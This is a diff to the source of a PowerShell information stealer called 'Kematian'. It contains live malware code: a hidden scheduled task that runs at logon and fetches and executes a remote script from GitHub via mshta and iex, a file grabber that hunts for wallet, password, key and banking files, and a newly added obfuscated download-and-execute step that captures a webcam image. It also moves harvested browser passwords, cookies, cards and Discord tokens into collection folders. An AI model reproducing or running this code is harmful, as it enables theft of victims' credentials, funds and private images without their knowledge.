@@ -83,10 +83,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -157,7 +157,6 @@ function Backup-Data {
     }
     Write-Host "[!] Backup Directories Created" -ForegroundColor Green
 	
-    #bulk data (added build ID with banner)
     function Get-Network {
         $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
         $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
@@ -956,13 +955,14 @@ function Backup-Data {
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
     function FilesGrabber {
+        $item_limit = 100
         $allowedExtensions = @("*.jpg", "*.png", "*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
         $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
             $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
                 $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
-            }
+            } | Select-Object -First $item_limit
             foreach ($file in $files) {
                 $destination = Join-Path -Path $important_files -ChildPath $file.Name
                 if ($file.FullName -ne $destination) {
@@ -989,7 +989,18 @@ function Backup-Data {
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
-
+    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
+    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
+    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
+    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+    $invokewebcam.WaitForExit()
+    $webcam_image = "$env:temp\webcam.png"
+    if (Test-Path -Path $webcam_image) {
+        Move-Item -Path $webcam_image -Destination $folder_general
+        Write-Host "The webcam image moved successfully to $folder_general" -ForegroundColor Green
+    } else {
+        Write-Host "The webcam image does not exist." -ForegroundColor Red
+    }
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
@@ -1053,15 +1064,15 @@ function Backup-Data {
 
     Write-Host "[!] Screenshot Captured" -ForegroundColor Green
 
-    Move-Item "$main_temp\discord.json" $folder_general -Force    
-    Move-Item "$main_temp\screenshot.png" $folder_general -Force
-    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
+    Move-Item "$main_temp\discord.json" $folder_general -Force -EA Ignore    
+    Move-Item "$main_temp\screenshot.png" $folder_general -Force -EA Ignore
+    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force -EA Ignore
+    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force -EA Ignore
     #move any file that starts with cookies_netscape
-    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force
+    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force -EA Ignore
+    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force -EA Ignore
+    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force -EA Ignore
+    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force -EA Ignore
 
     #remove empty dirs
     do {
